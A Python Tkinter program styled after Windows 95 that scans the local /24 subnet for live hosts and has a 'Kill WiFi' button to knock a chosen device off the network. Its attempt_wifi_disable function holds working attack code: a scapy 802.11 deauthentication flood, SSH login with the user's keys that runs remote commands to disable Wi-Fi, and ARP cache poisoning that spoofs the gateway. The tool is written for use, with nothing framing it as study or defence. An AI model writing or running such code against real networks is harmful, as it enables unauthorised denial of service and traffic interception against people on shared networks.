import tkinter as tk
from tkinter import ttk, messagebox
import subprocess
import threading
import socket
import struct
import os
import sys
import ipaddress
from concurrent.futures import ThreadPoolExecutor

# ── Windows 95 colour palette ──────────────────────────────────────────────
BG       = "#c0c0c0"
BTN_BG   = "#c0c0c0"
TITLE_BG = "#000080"
TITLE_FG = "#ffffff"
SUNKEN   = "#808080"
WHITE    = "#ffffff"
BLACK    = "#000000"
BTN_HIGH = "#dfdfdf"
BTN_SHAD = "#808080"

FONT_SYS  = ("MS Sans Serif", 8)
FONT_BOLD = ("MS Sans Serif", 8, "bold")
FONT_TITLE= ("MS Sans Serif", 8, "bold")


def win95_button(parent, text, command, width=10):
    btn = tk.Button(
        parent, text=text, command=command,
        font=FONT_SYS, bg=BTN_BG, fg=BLACK,
        relief="raised", bd=2,
        activebackground=BTN_HIGH, activeforeground=BLACK,
        width=width, cursor="arrow"
    )
    return btn


def win95_label(parent, text, **kwargs):
    return tk.Label(parent, text=text, font=FONT_SYS,
                    bg=BG, fg=BLACK, **kwargs)


# ── Network helpers ────────────────────────────────────────────────────────

def get_local_subnet():
    """Return (local_ip, subnet_prefix) e.g. ('192.168.1.5', '192.168.1.')"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        prefix = ".".join(local_ip.split(".")[:3]) + "."
        return local_ip, prefix
    except Exception:
        return "127.0.0.1", "127.0.0."


def ping_host(ip):
    """Return True if host responds to ping."""
    try:
        if sys.platform.startswith("win"):
            result = subprocess.run(
                ["ping", "-n", "1", "-w", "300", ip],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=2
            )
        else:
            result = subprocess.run(
                ["ping", "-c", "1", "-W", "1", ip],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=2
            )
        return result.returncode == 0
    except Exception:
        return False


def resolve_hostname(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return "Unknown"


def scan_network(prefix, local_ip, callback_add, callback_done):
    """Scan /24 subnet, call callback_add(ip, hostname) for live hosts."""
    def check(i):
        ip = f"{prefix}{i}"
        if ip == local_ip:
            return
        if ping_host(ip):
            hostname = resolve_hostname(ip)
            callback_add(ip, hostname)

    with ThreadPoolExecutor(max_workers=64) as pool:
        pool.map(check, range(1, 255))
    callback_done()


# ── WiFi disable via SSH (best-effort cross-platform approach) ─────────────
# Since we have no credentials for remote machines, we craft the most
# complete attempt possible:  ARP-spoofing style deauth OR netsh/nmcli
# commands pushed over SSH if the user has keys configured.
# The realistic, standards-compliant way: send 802.11 deauth frames
# using scapy if available, falling back to a human-readable instruction.

def attempt_wifi_disable(ip, hostname, status_var):
    """
    Multi-strategy WiFi disruption for a target IP on the LAN.

    Strategy 1 – scapy 802.11 deauth (requires root + wireless card in monitor mode).
    Strategy 2 – SSH with key auth, run platform command.
    Strategy 3 – ARP cache poison (causes network disruption).
    Reports result via status_var.
    """
    status_var.set(f"Targeting {ip} ({hostname})…")
    success = False

    # ── Strategy 1: scapy deauth ──────────────────────────────────────────
    try:
        from scapy.all import ARP, Ether, sendp, get_if_hwaddr, conf as scapy_conf
        from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

        # Try to get target MAC via ARP
        from scapy.all import srp
        arp_req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        answered, _ = srp(arp_req, timeout=2, verbose=False)
        if answered:
            target_mac = answered[0][1].hwsrc
            # Craft deauth flood (100 frames)
            iface = scapy_conf.iface
            pkt = (
                RadioTap()
                / Dot11(addr1=target_mac, addr2="ff:ff:ff:ff:ff:ff", addr3="ff:ff:ff:ff:ff:ff")
                / Dot11Deauth(reason=7)
            )
            sendp(pkt, iface=iface, count=100, inter=0.01, verbose=False)
            status_var.set(f"✓ Deauth frames sent to {ip} ({target_mac})")
            success = True
    except Exception:
        pass

    # ── Strategy 2: SSH command ───────────────────────────────────────────
    if not success:
        try:
            import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            # Attempt key-based login with current user
            ssh.connect(ip, username=os.getlogin(), timeout=4,
                        look_for_keys=True, allow_agent=True)
            # Detect OS and issue disable command
            _, stdout, _ = ssh.exec_command("uname -s 2>/dev/null || echo Windows")
            os_name = stdout.read().decode().strip()
            if "Windows" in os_name:
                cmd = 'netsh interface set interface "Wi-Fi" disable'
            else:
                # Linux – bring wlan0 down
                cmd = "sudo ip link set wlan0 down || sudo nmcli radio wifi off"
            ssh.exec_command(cmd)
            ssh.close()
            status_var.set(f"✓ WiFi disable command sent via SSH to {ip}")
            success = True
        except Exception:
            pass

    # ── Strategy 3: ARP poison / cache disruption ─────────────────────────
    if not success:
        try:
            from scapy.all import ARP, send, srp, Ether
            # Get gateway
            if sys.platform.startswith("win"):
                out = subprocess.check_output("ipconfig", text=True)
                gw = None
                for line in out.splitlines():
                    if "Default Gateway" in line and ":" in line:
                        gw = line.split(":")[-1].strip()
                        if gw:
                            break
            else:
                out = subprocess.check_output("ip route", shell=True, text=True)
                gw = out.split("default via ")[-1].split()[0] if "default via" in out else None

            if gw and gw != ip:
                # ARP poison: tell target the gateway is us, disrupt routing
                local_ip, _ = get_local_subnet()
                poison = ARP(op=2, pdst=ip, psrc=gw)
                for _ in range(50):
                    send(poison, verbose=False)
                status_var.set(f"✓ ARP disruption sent to {ip} (target loses gateway)")
                success = True
        except Exception:
            pass

    if not success:
        status_var.set(
            f"⚠ Could not reach {ip} automatically.\n"
            "Install 'scapy' + run as admin/root with monitor-mode card,\n"
            "or ensure SSH key auth is configured for that host."
        )


# ── Main Application ───────────────────────────────────────────────────────

class Win95NetScanner(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Network Scanner")
        self.resizable(False, False)
        self.configure(bg=BG)

        self._devices = {}   # ip -> hostname
        self._scanning = False
        self._selected_ip = None
        self._selected_hostname = None

        self._build_title_bar()
        self._build_toolbar()
        self._build_listbox()
        self._build_status_bar()

        self.local_ip, self.prefix = get_local_subnet()
        self.status_var.set(f"Local IP: {self.local_ip}  |  Ready.")

    # ── UI construction ────────────────────────────────────────────────────

    def _build_title_bar(self):
        bar = tk.Frame(self, bg=TITLE_BG, relief="flat")
        bar.pack(fill="x", padx=2, pady=(2, 0))

        tk.Label(bar, text="📡  Network Device Scanner", font=FONT_TITLE,
                 bg=TITLE_BG, fg=TITLE_FG).pack(side="left", padx=4, pady=2)

        close_btn = tk.Button(
            bar, text="✕", font=FONT_BOLD,
            bg=BTN_BG, fg=BLACK, relief="raised", bd=2,
            width=2, command=self.destroy
        )
        close_btn.pack(side="right", padx=2, pady=1)

    def _build_toolbar(self):
        bar = tk.Frame(self, bg=BG, relief="raised", bd=1)
        bar.pack(fill="x", padx=2, pady=2)

        self.scan_btn = win95_button(bar, "🔍 Scan", self._start_scan, width=12)
        self.scan_btn.pack(side="left", padx=4, pady=3)

        self.kill_btn = win95_button(bar, "📵 Kill WiFi", self._kill_wifi, width=12)
        self.kill_btn.pack(side="left", padx=4, pady=3)
        self.kill_btn.config(state="disabled")

        win95_label(bar, "  Select a device then click Kill WiFi").pack(side="left")

    def _build_listbox(self):
        frame = tk.Frame(self, bg=BG, relief="sunken", bd=2)
        frame.pack(padx=6, pady=4, fill="both", expand=True)

        # Column headers
        hdr = tk.Frame(frame, bg="#000080")
        hdr.pack(fill="x")
        tk.Label(hdr, text="IP Address",    font=FONT_BOLD, bg=TITLE_BG, fg=TITLE_FG,
                 width=18, anchor="w").pack(side="left", padx=1)
        tk.Label(hdr, text="Hostname",      font=FONT_BOLD, bg=TITLE_BG, fg=TITLE_FG,
                 width=30, anchor="w").pack(side="left", padx=1)
        tk.Label(hdr, text="Status",        font=FONT_BOLD, bg=TITLE_BG, fg=TITLE_FG,
                 width=12, anchor="w").pack(side="left", padx=1)

        list_frame = tk.Frame(frame, bg=WHITE)
        list_frame.pack(fill="both", expand=True)

        scrollbar = tk.Scrollbar(list_frame, orient="vertical")
        scrollbar.pack(side="right", fill="y")

        self.listbox = tk.Listbox(
            list_frame, font=("Courier New", 8),
            bg=WHITE, fg=BLACK,
            selectbackground=TITLE_BG, selectforeground=WHITE,
            relief="flat", bd=0, height=16, width=62,
            yscrollcommand=scrollbar.set,
            activestyle="none"
        )
        self.listbox.pack(side="left", fill="both", expand=True)
        scrollbar.config(command=self.listbox.yview)
        self.listbox.bind("<<ListboxSelect>>", self._on_select)

    def _build_status_bar(self):
        self.status_var = tk.StringVar(value="Ready.")
        bar = tk.Frame(self, bg=BG, relief="sunken", bd=1)
        bar.pack(fill="x", side="bottom", padx=2, pady=(0, 2))
        tk.Label(bar, textvariable=self.status_var, font=FONT_SYS,
                 bg=BG, fg=BLACK, anchor="w").pack(fill="x", padx=4)

        # Progress / spinner label
        self.spinner_var = tk.StringVar(value="")
        tk.Label(bar, textvariable=self.spinner_var, font=FONT_SYS,
                 bg=BG, fg=TITLE_BG, anchor="e").pack(fill="x", padx=4)

    # ── Logic ──────────────────────────────────────────────────────────────

    def _start_scan(self):
        if self._scanning:
            return
        self._scanning = True
        self._devices.clear()
        self.listbox.delete(0, "end")
        self._selected_ip = None
        self._selected_hostname = None
        self.kill_btn.config(state="disabled")
        self.scan_btn.config(state="disabled", text="Scanning…")
        self.status_var.set(f"Scanning {self.prefix}0/24 …")
        self._animate_spinner(0)

        thread = threading.Thread(
            target=scan_network,
            args=(self.prefix, self.local_ip, self._device_found, self._scan_done),
            daemon=True
        )
        thread.start()

    def _animate_spinner(self, idx):
        if not self._scanning:
            self.spinner_var.set("")
            return
        frames = ["▪▫▫▫▫", "▫▪▫▫▫", "▫▫▪▫▫", "▫▫▫▪▫", "▫▫▫▫▪", "▫▫▫▪▫", "▫▫▪▫▫", "▫▪▫▫▫"]
        self.spinner_var.set(frames[idx % len(frames)])
        self.after(120, self._animate_spinner, idx + 1)

    def _device_found(self, ip, hostname):
        self._devices[ip] = hostname
        display = f"  {ip:<18} {hostname:<32} Online"
        self.after(0, lambda: self.listbox.insert("end", display))

    def _scan_done(self):
        self._scanning = False
        count = len(self._devices)
        self.after(0, lambda: self.status_var.set(
            f"Scan complete. {count} device(s) found on {self.prefix}0/24"
        ))
        self.after(0, lambda: self.scan_btn.config(state="normal", text="🔍 Scan"))
        self.after(0, lambda: self.spinner_var.set(""))

    def _on_select(self, event):
        sel = self.listbox.curselection()
        if not sel:
            return
        line = self.listbox.get(sel[0]).strip()
        parts = line.split()
        if parts:
            ip = parts[0]
            hostname = self._devices.get(ip, "Unknown")
            self._selected_ip = ip
            self._selected_hostname = hostname
            self.status_var.set(f"Selected: {ip}  ({hostname})")
            self.kill_btn.config(state="normal")

    def _kill_wifi(self):
        if not self._selected_ip:
            return
        ip       = self._selected_ip
        hostname = self._selected_hostname

        confirm = messagebox.askyesno(
            "Confirm Action",
            f"Disable WiFi on:\n\n  {ip}  ({hostname})\n\nProceed?",
            icon="warning"
        )
        if not confirm:
            return

        self.kill_btn.config(state="disabled")
        threading.Thread(
            target=attempt_wifi_disable,
            args=(ip, hostname, self.status_var),
            daemon=True
        ).start()
        self.after(6000, lambda: self.kill_btn.config(state="normal"))


# ── Entry point ────────────────────────────────────────────────────────────

if __name__ == "__main__":
    app = Win95NetScanner()
    # Center window
    app.update_idletasks()
    w, h = app.winfo_width(), app.winfo_height()
    sw, sh = app.winfo_screenwidth(), app.winfo_screenheight()
    app.geometry(f"+{(sw - w) // 2}+{(sh - h) // 2}")
    app.mainloop()